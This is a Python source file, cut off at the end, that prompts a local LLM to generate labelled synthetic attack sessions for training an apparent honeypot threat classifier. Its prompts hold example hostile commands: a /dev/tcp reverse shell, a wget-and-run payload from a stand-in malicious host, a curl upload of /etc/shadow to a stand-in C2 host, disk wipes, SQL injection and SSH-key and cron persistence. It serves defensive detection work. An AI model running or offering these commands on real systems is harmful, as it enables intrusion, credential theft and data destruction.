"""
LLM-based Synthetic Data Generator for AdaptiveShield.

NEW ARCHITECTURE:
- LLM generates ONLY: commands + class_name + binary_type + system_changes_summary
- WE programmatically build ALL feature vectors (MITRE 21-dim, Triage 23-dim, Changes 20-dim)
- This removes burden from LLM and guarantees valid feature vectors

Additional LLM uses during training:
- Active learning: LLM explains misclassifications on validation set
- Edge case generation: LLM creates adversarial examples for weak classes
- Label verification: LLM reviews low-confidence predictions
"""

import asyncio
import json
import random
import pandas as pd
import numpy as np
from typing import List, Dict, Optional, Tuple, Any
from pathlib import Path
import sys

# Add src to path for imports
src_path = Path(__file__).parent.parent.parent
sys.path.insert(0, str(src_path))

from honeypot.router import LLMRouter
from core.mitre.attack_mapping import TACTICS, TACTIC_NAMES, ATTACK_PATTERNS, BINARY_TAG_TO_TECHNIQUE
from core.mitre.session_annotator import annotate_session, get_mitre_feature_columns, annotation_to_flat_dict


# =============================================================================
# Class Configuration with MITRE Constraints
# =============================================================================

CLASS_CONFIG = {
    0: {
        "name": "Safe",
        "target_tactics": [],
        # Only block truly aggressive post-compromise tactics
        # 'discovery' intentionally NOT forbidden — ls/ps/whoami/uname all map to it
        "forbidden_tactics": ["credential_access", "persistence", "command_and_control",
                              "impact", "defense_evasion", "exfiltration", "lateral_movement",
                              "execution", "privilege_escalation", "initial_access",
                              "resource_development"],
        "preferred_techniques": [],
        "min_preferred_ratio": 0.0,  # Safe has no required techniques
        "typical_binary_behaviors": [],
        "system_changes": ["file_read", "process_list"],
        "target_count": 5000,
    },
    1: {
        "name": "Recon",
        "target_tactics": ["discovery", "reconnaissance"],
        "forbidden_tactics": ["persistence", "command_and_control", "impact",
                              "exfiltration", "lateral_movement", "execution",
                              "defense_evasion", "privilege_escalation"],
        # Best-effort: these are all techniques we WANT to see, but any subset is fine
        "preferred_techniques": ["T1046", "T1083", "T1082", "T1016", "T1049", "T1033", "T1057", "T1087.001", "T1595.002", "T1595.003"],
        "min_preferred_ratio": 0.25,  # Hit at least 25% of preferred techniques
        "typical_binary_behaviors": ["recon_scanner"],
        "system_changes": ["file_read", "network_probe", "process_list"],
        "target_count": 12000,
    },
    2: {
        "name": "Downloader",
        "target_tactics": ["command_and_control", "initial_access"],
        "forbidden_tactics": ["impact", "credential_access", "exfiltration",
                              "lateral_movement", "persistence", "defense_evasion",
                              "privilege_escalation"],
        "preferred_techniques": ["T1105", "T1059.006", "T1059.004", "T1610", "T1190"],
        "min_preferred_ratio": 0.25,  # Hit at least 25%
        "typical_binary_behaviors": ["miner", "botnet", "downloader"],
        "system_changes": ["file_write", "file_download", "process_exec", "network_conn"],
        "target_count": 5000,
    },
    3: {
        "name": "Exploit",
        "target_tactics": ["credential_access", "defense_evasion", "initial_access"],
        "forbidden_tactics": [],
        # Best-effort pool: LLM can pick any creative subset
        "preferred_techniques": ["T1552.001", "T1059.004", "T1140", "T1548.001",
                                  "T1070.003", "T1552.004", "T1548.003", "T1059.006", "T1190"],
        "min_preferred_ratio": 0.25,  # At least 2 out of 9
        "typical_binary_behaviors": ["credential_stealer", "rat", "packed", "web_shell", "sqli_payloads"],
        "system_changes": ["file_read", "process_exec", "file_write", "credential_access", "log_clear"],
        "target_count": 8000,
    },
    4: {
        "name": "Destructive",
        "target_tactics": ["impact"],
        "forbidden_tactics": [],
        "preferred_techniques": ["T1485", "T1486", "T1070.002", "T1070.003", "T1561.001", "T1561.002", "T1190"],
        "min_preferred_ratio": 0.25,  # At least 2 out of 7
        "typical_binary_behaviors": ["destructive", "ransomware", "wiper"],
        "system_changes": ["file_delete", "file_encrypt", "log_clear", "service_stop", "config_modify"],
        "target_count": 8000,
    },
    5: {
        "name": "ADVANCED_APT",
        "target_tactics": ["persistence", "command_and_control", "initial_access"],
        "forbidden_tactics": [],
        "preferred_techniques": ["T1053.003", "T1098.004", "T1543.002", "T1105",
                                  "T1552.001", "T1048.003", "T1059.004", "T1190"],
        "min_preferred_ratio": 0.25,  # At least ~2 out of 8
        "typical_binary_behaviors": ["go_binary", "multi_capability", "persistence", "credential_access", "c2"],
        "system_changes": ["user_add", "cron_add", "ssh_key_add", "service_create", "config_modify",
                           "file_write", "network_conn", "credential_access", "exfiltration"],
        "target_count": 5000,
    },
}

CLASS_NAMES = ['Safe', 'Recon', 'Downloader', 'Exploit', 'Destructive', 'ADVANCED_APT']


# =============================================================================
# MITRE Knowledge Base Helpers
# =============================================================================

def get_techniques_for_tactics(tactics: List[str]) -> List[str]:
    """Get all technique IDs for given tactics from the MITRE KB."""
    techniques = set()
    for pattern in ATTACK_PATTERNS:
        if pattern["tactic"] in tactics:
            techniques.add(pattern["technique_id"])
    return sorted(techniques)


def get_forbidden_techniques(forbidden_tactics: List[str]) -> List[str]:
    """Get technique IDs that should NOT appear for forbidden tactics."""
    techniques = set()
    for pattern in ATTACK_PATTERNS:
        if pattern["tactic"] in forbidden_tactics:
            techniques.add(pattern["technique_id"])
    return sorted(techniques)


def get_binary_behavior_techniques(binary_behaviors: List[str]) -> List[str]:
    """Map binary behavior tags to MITRE techniques."""
    techniques = set()
    for behavior in binary_behaviors:
        if behavior in BINARY_TAG_TO_TECHNIQUE:
            for bt in BINARY_TAG_TO_TECHNIQUE[behavior]:
                techniques.add(bt["technique_id"])
    return sorted(techniques)


# =============================================================================
# System Prompt - SIMPLIFIED: LLM only outputs commands + metadata
# =============================================================================

SIMPLIFIED_SYSTEM_PROMPT = """You are a red team operator generating realistic attack sessions for cybersecurity training.
CRITICAL ENVIRONMENT CONSTRAINTS:
1. The target environment is a LINUX system (Ubuntu/Debian) running an exposed HTTP web application.
2. DO NOT generate Windows commands (no PowerShell, no .exe, no cmd.exe).
3. You should generate raw HTTP requests (e.g., `GET /login.php?user=admin'-- HTTP/1.1`, `POST /api/upload`) to accurately simulate attacks against web services and post-compromise actions.

JSON SCHEMA CONSTRAINTS:
1. Output ONLY a flat JSON object.
2. The "commands" field MUST be a SINGLE STRING of semicolon-separated HTTP requests.
3. DO NOT output a list of dictionaries for commands. DO NOT create nested schemas.

EXPECTED JSON FORMAT:
{
  "commands": "GET /index.html HTTP/1.1; POST /login.php HTTP/1.1; GET /admin HTTP/1.1",
  "class_name": "Recon|Downloader|Exploit|Destructive|ADVANCED_APT|Safe",
  "binary_type": "miner|botnet|downloader|rat|credential_stealer|packed|destructive|ransomware|go_binary|none",
  "system_changes_summary": "brief description of system changes"
}

=== COMPREHENSIVE CLASS EXAMPLES (MUST INCLUDE COMMANDS TO TRIGGER ALL LISTED TECHNIQUES) ===


=== Recon (1) ===
REQUIRED TECHNIQUES: T1046 (Network Service Discovery), T1083 (File/Directory Discovery), T1087.001 (Local Account), T1082 (System Info), T1016 (Network Config), T1049 (Network Connections), T1033 (User Discovery), T1057 (Process Discovery)
COMMANDS: GET /admin/login.php HTTP/1.1; GET /api/v1/users HTTP/1.1; sqlmap -u http://localhost; nmap -sV -p 80,443,22 192.168.1.0/24; cat /etc/passwd; uname -a; ps aux
BINARY: recon_scanner
SYSTEM CHANGES: web directory enumeration, network scan, port enumeration, user enumeration, system info gathering

=== Downloader (2) ===
REQUIRED TECHNIQUES: T1105 (Ingress Tool Transfer), T1204.002 (User Execution), T1059.004 (Unix Shell), T1072 (Software Deployment), T1610 (Deploy Container)
COMMANDS: POST /upload.php HTTP/1.1; wget http://malicious.com/payload.sh; chmod +x payload.sh; ./payload.sh &
BINARY: miner
SYSTEM CHANGES: malicious file upload, file write, file download, process execution, network connection to C2

=== Exploit (3) ===
REQUIRED TECHNIQUES: T1552.001 (Credentials in Files), T1059.004 (Unix Shell), T1140 (Deobfuscate/Decode), T1548.001 (Setuid/Setgid), T1070.003 (Clear Command History), T1003 (OS Credential Dumping), T1552.004 (Private Keys), T1059.006 (Python), T1222.002 (File Permissions), T1548.003 (Sudo), T1556 (Modify Auth)
COMMANDS: POST /login.php?user=admin' OR 1=1-- HTTP/1.1; GET /api/download?file=../../../../etc/shadow HTTP/1.1; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1; sudo -l; cat ~/.ssh/id_rsa
BINARY: rat
SYSTEM CHANGES: file read (/etc/shadow), credential access, process execution (reverse shell), file write (exploit binary), log clearing (history -c), credential dumping, setuid binary, sudo, password manipulation, credential export, credential dumping

=== Destructive (4) ===
REQUIRED TECHNIQUES: T1485 (Data Destruction), T1486 (Data Encrypted for Impact), T1499.004 (Fork Bomb), T1070.002 (Clear Linux Logs), T1070.003 (Clear Command History), T1561.001 (Disk Wipe), T1561.002 (Disk Structure Wipe)
COMMANDS: POST /upload/rm.php HTTP/1.1; rm -rf /; dd if=/dev/zero of=/dev/sda; history -c; shred -u /etc/shadow
BINARY: destructive
SYSTEM CHANGES: file deletion (/var/log/*), file encryption (openssl), log clearing (history -c), service stop (sshd), config modification (iptables), disk structure wipe, fork bomb, disk wipe

=== ADVANCED_APT (5) ===
REQUIRED TECHNIQUES: T1053.003 (Cron), T1098.004 (SSH Authorized Keys), T1543.002 (Systemd Service), T1105 (Ingress Tool Transfer), T1552.001 (Credentials in Files), T1048.003 (Exfiltration Over C2), T1059.004 (Unix Shell), T1102.002 (Bidirectional Comm), T1102.001 (Web Service), T1556 (Modify Auth), T1027.002 (Software Packing)
COMMANDS: POST /upload/backdoor.php HTTP/1.1; echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys; curl -X POST -d @/etc/shadow http://c2.com/exfil; crontab -l | { cat; echo "* * * * * /tmp/backdoor"; } | crontab -
BINARY: go_binary
SYSTEM CHANGES: file write, file download, process execution, credential access, exfiltration, cron job, SSH key addition, systemd service, config modification

=== Safe (0) ===
COMMANDS: GET / HTTP/1.1; GET /index.html HTTP/1.1; ls -la; pwd; whoami
BINARY: none
SYSTEM CHANGES: file read, process list

COMMANDS MUST USE SEMICOLONS (; ) TO SEPARATE COMMANDS, NOT NEWLINES.
"""

# =============================================================================)


# =============================================================================
# Feature Vector Builders (Programmatic - No LLM)
# =============================================================================

def get_mitre_feature_columns() -> List[str]:
    """Get the 21 MITRE feature column names."""
    from core.mitre.session_annotator import get_mitre_feature_columns as _get_cols
    return _get_cols()


def build_mitre_features_from_commands(commands: str, class_id: int) -> Dict[str, float]:
    """Build 21-dim MITRE feature vector by running commands through annotator."""
    cmd_list = [c.strip() for c in commands.replace("&&", ";").replace("||", ";").replace("\\n", ";").split(";") if c.strip()]
    annotation = annotate_session(cmd_list)
    return annotation_to_flat_dict(annotation)


def build_triage_features_from_binary_type(binary_type: str, class_id: int) -> Dict[str, float]:
    """Build 23-dim triage feature vector from binary type and class."""
    config = CLASS_CONFIG[class_id]
    vec = {}

    # Base triage features (all 23 columns)
    triage_cols = [
        'triage_file_size', 'triage_entropy', 'triage_priority',
        'triage_is_go', 'triage_is_packed', 'triage_is_stripped',
        'triage_is_dll', 'triage_is_static', 'triage_score_mining',
        'triage_score_botnet', 'triage_score_recon', 'triage_score_destructive',
        'triage_ghidra_score', 'triage_angr_score'
    ]

    for col in triage_cols:
        vec[col] = 0.0

    if binary_type == "none":
        return vec

    # Class-specific triage templates
    size_map = {
        "recon_scanner": (10000, 500000),
        "miner": (50000, 2000000),
        "botnet": (50000, 2000000),
        "downloader": (50000, 2000000),
        "rat": (50000, 2000000),
        "credential_stealer": (50000, 2000000),
        "packed": (50000, 2000000),
        "destructive": (50000, 2000000),
        "ransomware": (50000, 2000000),
        "wiper": (50000, 2000000),
        "go_binary": (1000000, 30000000),
        "multi_capability": (1000000, 30000000),
        "persistence": (50000, 2000000),
        "credential_access": (50000, 2000000),
        "c2": (50000, 2000000),
    }

    entropy_map = {
        "recon_scanner": (5.5, 7.5),
        "miner": (6.5, 7.9),
        "botnet": (6.5, 7.9),
        "downloader": (6.5, 7.9),
        "rat": (6.5, 7.9),
        "credential_stealer": (6.5, 7.9),
        "packed": (7.0, 7.9),
        "destructive": (6.5, 7.9),
        "ransomware": (6.5, 7.9),
        "wiper": (6.5, 7.9),
        "go_binary": (7.0, 7.9),
        "multi_capability": (7.0, 7.9),
        "persistence": (6.5, 7.9),
        "credential_access": (6.5, 7.9),
        "c2": (6.5, 7.9),
    }

    min_size, max_size = size_map.get(binary_type, (10000, 500000))
    min_ent, max_ent = entropy_map.get(binary_type, (5.5, 7.5))

    vec['triage_file_size'] = random.uniform(min_size, max_size)
    vec['triage_entropy'] = random.uniform(min_ent, max_ent)
    vec['triage_priority'] = random.uniform(20, 90)
    vec['triage_is_stripped'] = 1.0
    vec['triage_is_packed'] = 1.0 if binary_type in ["packed", "miner", "botnet", "rat", "credential_stealer"] else 0.0
    vec['triage_is_go'] = 1.0 if binary_type == "go_binary" else 0.0
    vec['triage_is_stripped'] = 1.0

    # Score indicators
    score_map = {
        "miner":               ("triage_score_mining",       0.7, 1.0),
        "botnet":              ("triage_score_botnet",       0.7, 1.0),
        "recon_scanner":       ("triage_score_recon",        0.5, 1.0),
        "destructive":         ("triage_score_destructive",  0.7, 1.0),
        "ransomware":          ("triage_score_destructive",  0.7, 1.0),
        "wiper":               ("triage_score_destructive",  0.7, 1.0),
        "rat":                 ("triage_score_botnet",       0.6, 0.95),
        "credential_stealer":  ("triage_score_botnet",       0.5, 0.9),
        "c2":                  ("triage_score_botnet",       0.6, 0.95),
        "persistence":         ("triage_score_botnet",       0.4, 0.8),
        "multi_capability":    ("triage_score_botnet",       0.7, 1.0),
        "go_binary":           ("triage_score_botnet",       0.6, 1.0),
        "packed":              ("triage_score_botnet",       0.5, 0.9),
        "downloader":          ("triage_score_mining",       0.4, 0.8),
    }

    if binary_type in score_map:
        col, min_v, max_v = score_map[binary_type]
        vec[col] = random.uniform(min_v, max_v)
        
        # Fake deep analysis scores (Knowledge Distillation targets)
        # Deep analysis generally confirms the static score but with higher certainty
        vec['triage_ghidra_score'] = min(1.0, random.uniform(min_v + 0.1, max_v + 0.2))
        vec['triage_angr_score'] = min(1.0, random.uniform(min_v, max_v + 0.1))
    else:
        vec['triage_ghidra_score'] = 0.0
        vec['triage_angr_score'] = 0.0

    return vec


def build_change_features_from_summary(summary: str, class_id: int) -> np.ndarray:
    """Build ~20-dim change feature vector from LLM's text summary."""
    vec = np.zeros(20, dtype=np.float32)
    summary_lower = summary.lower()

    # File writes (0-5)
    vec[0] = summary_lower.count("file_write") + summary_lower.count("write")
    vec[1] = 1.0 if "executable" in summary_lower else 0.0
    vec[2] = 1.0 if any(x in summary_lower for x in ["/etc/", "/root/", "/home/"]) else 0.0
    vec[3] = 1.0 if "entropy" in summary_lower and "high" in summary_lower else 0.0
    vec[4] = 1.0 if "encrypt" in summary_lower else 0.0
    vec[5] = summary_lower.count("delete") + summary_lower.count("remove")

    # Process execution (6-9)
    vec[6] = summary_lower.count("exec") + summary_lower.count("process")
    vec[7] = 1.0 if any(x in summary_lower for x in ["wget", "curl", "bash", "sh", "python"]) else 0.0
    vec[8] = 1.0 if any(x in summary_lower for x in ["sudo", "su "]) else 0.0
    vec[9] = 1.0 if any(x in summary_lower for x in ["/tmp/", "/var/tmp/"]) else 0.0

    # Network connections (10-13)
    vec[10] = summary_lower.count("network") + summary_lower.count("connection")
    vec[11] = 1.0 if "c2" in summary_lower or "command" in summary_lower and "control" in summary_lower else 0.0
    vec[12] = 1.0 if any(str(p) in summary_lower for p in [22, 80, 443, 4444, 8080, 6667]) else 0.0
    vec[13] = 1.0 if "external" in summary_lower or "internet" in summary_lower else 0.0

    # User/account changes (14-16)
    vec[14] = summary_lower.count("user") + summary_lower.count("account")
    vec[15] = 1.0 if "ssh" in summary_lower and "key" in summary_lower else 0.0
    vec[16] = 1.0 if any(x in summary_lower for x in ["root", "admin"]) else 0.0

    # Scheduled tasks (17-19)
    vec[17] = summary_lower.count("cron") + summary_lower.count("systemd")
    vec[18] = 1.0 if "@reboot" in summary_lower else 0.0
    vec[19] = 1.0 if any(x in summary_lower for x in ["wget", "curl", "bash", "sh"]) else 0.0

    return vec


# =============================================================================
# Validation Functions
# =============================================================================

def validate_session_mitre(session_json: Dict, class_id: int) -> Tuple[bool, List[str]]:
    """Validate that the generated session matches MITRE constraints for its class.
    
    Validation rules:
    - forbidden_tactics: HARD block — any presence = instant fail
    - target_tactics: SOFT — at least one must fire (warns but doesn't fail alone)
    - preferred_techniques: SOFT — must hit min_preferred_ratio of the pool
    """
    config = CLASS_CONFIG[class_id]
    commands = session_json.get("commands", "")

    cmd_list = [c.strip() for c in commands.replace("&&", ";").replace("||", ";").replace("\\n", ";").split(";") if c.strip()]
    annotation = annotate_session(cmd_list)

    errors = []

    # HARD CHECK: forbidden tactics must NOT be present
    for tactic in config.get("forbidden_tactics", []):
        if annotation["tactic_vector"].get(tactic, 0) > 0:
            errors.append(f"Forbidden tactic present: {tactic}")

    # SOFT CHECK: at least one target tactic should fire
    target_tactics = config.get("target_tactics", [])
    if target_tactics:
        tactics_hit = sum(1 for t in target_tactics if annotation["tactic_vector"].get(t, 0) > 0)
        if tactics_hit == 0:
            errors.append(f"No target tactics fired (wanted at least 1 of: {target_tactics})")

    # SOFT CHECK: preferred techniques — ratio-based threshold
    preferred_techs = config.get("preferred_techniques", [])
    min_ratio = config.get("min_preferred_ratio", 0.0)
    if preferred_techs and min_ratio > 0:
        matched_techs = set(annotation["technique_ids"])
        hits = len(set(preferred_techs) & matched_techs)
        ratio = hits / len(preferred_techs)
        if ratio < min_ratio:
            missing = set(preferred_techs) - matched_techs
            errors.append(f"Preferred technique coverage {ratio:.0%} < {min_ratio:.0%} threshold (hit {hits}/{len(preferred_techs)}, missing: {missing})")

    return len(errors) == 0, errors


# =============================================================================
# LLM Response Parser
# =============================================================================

def parse_llm_response(response: str) -> Dict:
    """Parse JSON from LLM response, handling common issues."""
    text = response.strip()

    # DeepSeek-R1 outputs internal thoughts in <think> tags. Strip them out.
    import re
    text = re.sub(r'<think>.*?</think>', '', text, flags=re.DOTALL).strip()

    # Try direct parse
    try:
        return json.loads(text)
    except json.JSONDecodeError:
        pass

    # Try extracting JSON from markdown/code blocks
    match = re.search(r'```(?:json)?\s*(\{.*?\})\s*```', text, re.DOTALL)
    if match:
        try:
            return json.loads(match.group(1))
        except json.JSONDecodeError:
            pass

    # Try finding first { ... }
    match = re.search(r'(\{.*\})', text, re.DOTALL)
    if match:
        try:
            return json.loads(match.group(1))
        except json.JSONDecodeError:
            pass

    raise ValueError(f"Could not parse JSON from response: {text[:200]}")


# =============================================================================
# Main Generator Class
# =============================================================================

class LLMSyntheticGenerator:
    """
    Generates synthetic sessions using local LLM (Qwen via Ollama).

    NEW FLOW:
    1. LLM generates: commands + class_name + binary_type + system_changes_summary
    2. WE build: MITRE features (21), Triage features (23), Change features (20)
    3. Validate MITRE constraints
    4. Return complete session JSON
    """

    def __init__(
        self,
        config: Dict,
        random_seed: int = 42,
        max_retries: int = 3,
        validation_enabled: bool = True,
    ):
        self.config = config
        self.random_seed = random_seed
        self.max_retries = max_retries
        self.validation_enabled = validation_enabled

        random.seed(random_seed)
        np.random.seed(random_seed)

        self.llm_router = LLMRouter(config)
        self.few_shot_examples = self._load_few_shot_examples()

    def _parse_json_response(self, response: str) -> Dict:
        """Parse JSON from LLM response, with multi-level fallbacks for messy output."""
        import re
        text = response.strip()

        # Strip <think> tags (DeepSeek / reasoning models)
        text = re.sub(r'<think>.*?</think>', '', text, flags=re.DOTALL).strip()

        # Strip markdown code fences (```json ... ``` or ``` ... ```)
        text = re.sub(r'^```(?:json)?\s*', '', text, flags=re.MULTILINE)
        text = re.sub(r'\s*```\s*$', '', text, flags=re.MULTILINE)
        text = text.strip()

        # Attempt 1: direct parse
        try:
            return json.loads(text)
        except json.JSONDecodeError:
            pass

        # Attempt 2: find outermost { ... } and parse
        match = re.search(r'(\{.*\})', text, re.DOTALL)
        if match:
            try:
                return json.loads(match.group(1))
            except json.JSONDecodeError:
                pass

        # Attempt 3: surgical field extraction (handles badly nested quotes in commands)
        # Extract each field individually using non-greedy patterns
        try:
            result = {}

            # Extract commands: take everything between "commands": " and the last occurrence
            # before the next top-level key. Uses a greedy grab then trims.
            cmd_match = re.search(r'"commands"\s*:\s*"((?:[^"\\]|\\.)*)"\s*[,}]', text, re.DOTALL)
            if not cmd_match:
                # Fallback: grab up to the next key
                cmd_match = re.search(r'"commands"\s*:\s*"(.+?)"\s*,\s*"(?:class_name|binary_type|system)', text, re.DOTALL)
            if cmd_match:
                # Normalize: replace literal \n with semicolon, strip extra backslashes
                cmds = cmd_match.group(1)
                cmds = cmds.replace('\\n', '; ').replace('\n', '; ')
                # Remove triple-escaped quotes that break downstream parsing
                cmds = re.sub(r'\\{2,}"', '"', cmds)
                result["commands"] = cmds
            else:
                return {}  # Can't recover without commands

            binary_m = re.search(r'"binary_type"\s*:\s*"([^"]*)"', text)
            class_m = re.search(r'"class_name"\s*:\s*"([^"]*)"', text)
            changes_m = re.search(r'"system_changes_summary"\s*:\s*"([^"]*)"', text)

            result["binary_type"] = binary_m.group(1) if binary_m else "none"
            result["class_name"] = class_m.group(1) if class_m else ""
            result["system_changes_summary"] = changes_m.group(1) if changes_m else ""
            return result
        except Exception:
            pass

        raise ValueError(f"Could not parse JSON from response: {text[:300]}")

    def _load_few_shot_examples(self, n_per_class: int = 5) -> Dict[int, List[Dict]]:
        """Load few-shot examples from real sessions_complete.csv."""
        try:
            df = pd.read_csv("data/exports/sessions_complete.csv")
            examples = {}

            for class_id in range(6):
                class_df = df[df["label_id"] == class_id]
                if len(class_df) > 0:
                    samples = class_df.sample(n=min(n_per_class, len(class_df)), random_state=self.random_seed)
                    examples[class_id] = samples.to_dict('records')
                else:
                    examples[class_id] = []

            return examples
        except Exception as e:
            print(f"Warning: Could not load few-shot examples: {e}")
            return {i: [] for i in range(6)}

    def _build_prompt(self, class_id: int) -> str:
        """Build prompt for LLM with class-specific guidance."""
        config = CLASS_CONFIG[class_id]
        class_name = config["name"]

        # Get few-shot examples from real data
        few_shot = self.few_shot_examples.get(class_id, [])
        few_shot_str = ""
        if config["target_tactics"]:
            few_shot_str = "\n\nREAL EXAMPLES FROM DATA:\n"
            for i, ex in enumerate(self.few_shot_examples.get(class_id, [])[:3]):
                cmds = ex.get("commands", "")[:200]
                few_shot_str += f"Example {i+1}: {cmds}...\n"

        # Class-aware creativity
        if class_id == 0:
            creativity_instruction = (
                "STRICT: Generate ONLY benign HTTP requests and benign Linux commands. "
                "Vary the HTTP pages (GET /, /index.html) and basic Linux discovery (ls, pwd, whoami). "
                "ZERO offensive commands. No attempts to access admin panels, no file uploads, no shell command injection. Safe benign session only."
            )
        elif class_id == 1:
            creativity_instruction = (
                "STRICT: Generate a mix of HTTP reconnaissance (e.g., scanning for admin pages, common files) and Linux system discovery commands. "
                "Allowed HTTP patterns: GET to /admin, /server-status, /phpinfo.php, /backup. "
                "Allowed Bash patterns: ls, ps, netstat, nmap, uname. "
                "FORBIDDEN: POST requests with file uploads, PUT, DELETE, any attempts to exploit (like SQL injection or command injection). Stay PURELY within discovery enumeration."
            )
        elif class_id == 2:
            creativity_instruction = (
                "STRICT: Generate a mix of HTTP file transfers and Linux bash commands for executing downloaded payloads. "
                "Allowed HTTP patterns: POST to /upload.php; GET to /download/*.sh. "
                "Allowed Bash patterns: curl, wget, chmod +x, ./payload, python3 script.py. "
                "FORBIDDEN: Any attempts to exploit (like SQL injection) or access admin panels without file transfer intent. Stay PURELY within file transfer and execution."
            )
        elif class_id == 3:
            creativity_instruction = (
                "CRITICAL: Be a highly creative red team operator. Start with an HTTP exploit request, followed by Linux bash commands. "
                "Allowed HTTP patterns: POST to /login.php with SQLi; Command injection parameters; GET to /api/download?file=../../etc/shadow. "
                "Allowed Bash patterns: bash -i, cat /etc/shadow, sudo -l, chmod +s. "
                "FORBIDDEN: Benign requests that do not contain exploit patterns. Stay FOCUSED on exploitation."
            )
        elif class_id == 4:
            creativity_instruction = (
                "STRICT: Generate a mix of HTTP requests triggering destructive actions and Linux bash commands causing destruction. "
                "Allowed HTTP patterns: POST to /upload/rm.php, /upload/shred.php, /upload/dd.php. "
                "Allowed Bash patterns: rm -rf, shred -u, dd if=/dev/zero, history -c. "
                "FORBIDDEN: Benign requests. Stay FOCUSED on destruction."
            )
        elif class_id == 5:
            creativity_instruction = (
                "CRITICAL: Be a highly creative APT operator. Start with an HTTP request to drop a webshell/backdoor, followed by Linux bash commands for persistence/C2. "
                "Allowed HTTP patterns: POST to /upload/backdoor.php, /upload/exfil.php. "
                "Allowed Bash patterns: echo 'ssh-rsa...' >> ~/.ssh/authorized_keys, crontab, systemctl enable backdoor. "
                "FORBIDDEN: Benign requests. Stay FOCUSED on APT activities."
            )
        else:
            # Fallback (should not happen)
            creativity_instruction = (
                "CRITICAL: Be a highly creative red team operator. Blend HTTP requests and Linux Bash commands. "
                "JSON SAFETY: The commands field is a JSON string. You MUST use double-quotes for any inline Python/bash. "
                "Write python3 -c \"import os\" NOT python3 -c 'import os'. "
                "Do NOT use single quotes inside the commands string."
            )

        return f"""Generate a {config['name']} session.

TARGET CLASS: {config['name']} (id={class_id})
TARGET TACTICS (at least one must fire): {config['target_tactics']}
PREFERRED TECHNIQUES (pick a creative subset, don't need all): {config.get('preferred_techniques', [])}
FORBIDDEN TACTICS (absolutely must NOT appear): {config['forbidden_tactics']}
TYPICAL BINARY: {config['typical_binary_behaviors']}
SYSTEM CHANGES: {config['system_changes']}

{few_shot_str}

{creativity_instruction}

Output ONLY the JSON format specified in the system prompt."""

    async def generate_session(self, class_id: int) -> Optional[Dict]:
        """Generate a single valid session for the given class, using conversational retries."""
        config = CLASS_CONFIG[class_id]
        
        # Initialize conversation history
        messages = [
            {"role": "system", "content": SIMPLIFIED_SYSTEM_PROMPT},
            {"role": "user", "content": self._build_prompt(class_id)}
        ]

        for attempt in range(self.max_retries):
            try:
                # Generate with LLM using chat history
                response = await self.llm_router.chat(config["name"], messages)

                # Parse LLM response (simple format)
                llm_output = self._parse_json_response(response)

                # Extract LLM output
                commands = llm_output.get("commands", "")
                binary_type = llm_output.get("binary_type", "none")
                changes_summary = llm_output.get("system_changes_summary", "")
                llm_class = llm_output.get("class_name", CLASS_CONFIG[class_id]["name"])

                if not commands:
                    print(f"  Attempt {attempt+1}: LLM returned empty commands")
                    # Append error for retry
                    messages.append({"role": "assistant", "content": response})
                    messages.append({"role": "user", "content": "You returned empty commands or invalid JSON. Please return valid JSON containing the 'commands' array."})
                    continue

                # WE PROGRAMMATICALLY BUILD ALL FEATURE VECTORS
                # 1. MITRE features (21-dim) from commands
                mitre_features = build_mitre_features_from_commands(commands, class_id)

                # 2. Triage features (23-dim) from binary type
                triage_features = build_triage_features_from_binary_type(
                    llm_output.get("binary_type", "none"), class_id
                )

                # 3. Change features (20-dim) from LLM summary
                changes_summary = llm_output.get("system_changes_summary", "")
                change_features = build_change_features_from_summary(
                    llm_output.get("system_changes_summary", ""), class_id
                )

                # Build complete session
                session_json = {
                    "session_id": f'synthetic_{CLASS_CONFIG[class_id]["name"].lower()}_{random.randint(100000, 999999)}',
                    "src_ip": f'{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}',
                    "num_commands": commands.count(';') + 1,
                    "duration_sec": random.uniform(10, 1200),
                    "commands": commands,
                    "label_id": class_id,
                    "label_name": CLASS_CONFIG[class_id]["name"],
                    "mitre_features": mitre_features,
                    "triage_features": triage_features,
                    "change_features": change_features.tolist(),
                    "num_downloads": 1 if triage_features.get("triage_file_size", 0) > 0 else 0,
                    "download_shas": "",
                    "binary_type": llm_output.get("binary_type", "none"),
                    "system_changes_summary": changes_summary,
                }

                # Validate MITRE constraints
                if self.validation_enabled:
                    mitre_valid, mitre_errors = validate_session_mitre(
                        {"commands": commands}, class_id
                    )
                    if not mitre_valid:
                        print(f"  MITRE validation failed (attempt {attempt+1}): {mitre_errors}")
                        # User Request: If this is the final attempt, accept it anyway instead of falling back
                        if attempt < self.max_retries - 1:
                            messages.append({"role": "assistant", "content": response})
                            messages.append({"role": "user", "content": f"Your previous output failed validation. Errors: {mitre_errors}. Please try again and fix these issues while maintaining valid JSON."})
                            continue
                        else:
                            print(f"  ⚠ Accepting session despite validation errors (final attempt fallback override)")

                print(f"  ✓ Generated valid {CLASS_CONFIG[class_id]['name']} session")
                return {
                    **session_json,
                    "session_id": f'synthetic_{CLASS_CONFIG[class_id]["name"].lower()}_{random.randint(100000, 999999)}',
                    "src_ip": f'{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}',
                    "num_commands": commands.count(';') + 1,
                    "duration_sec": random.uniform(10, 1200),
                    "label_name": CLASS_CONFIG[class_id]["name"],
                    "num_downloads": 1 if triage_features.get("triage_file_size", 0) > 0 else 0,
                    "download_shas": "",
                }

            except Exception as e:
                print(f"  Attempt {attempt+1} failed: {e}")
                await asyncio.sleep(1)

        print(f"  ✗ Failed to generate valid session after {self.max_retries} attempts")
        return None


async def generate_synthetic_sessions_llm(
    config: Dict,
    n_per_class: Dict[int, int],
    random_seed: int = 42,
    max_retries: int = 3,
    validation_enabled: bool = True,
    output_path: Optional[str] = None,
) -> pd.DataFrame:
    """Main entry point for generating LLM-based synthetic sessions."""
    generator = LLMSyntheticGenerator(
        config=config,
        random_seed=random_seed,
        max_retries=max_retries,
        validation_enabled=validation_enabled,
    )

    all_sessions = []
    total_target = sum(n_per_class.values())
    generated = 0

    print(f"\n{'='*60}")
    print(f"LLM Synthetic Data Generation (New Architecture)")
    print(f"Target: {sum(n_per_class.values())} sessions across {len(n_per_class)} classes")
    print(f"LLM: {config.get('galah_honeypot', {}).get('llm', {}).get('ollama_model', 'qwen2.5-coder:7b-instruct-q4_K_M')}")
    print(f"{'='*60}\n")

    for class_id in range(6):
        target = n_per_class.get(class_id, 0)
        if target == 0:
            continue

        class_name = CLASS_CONFIG[class_id]["name"]
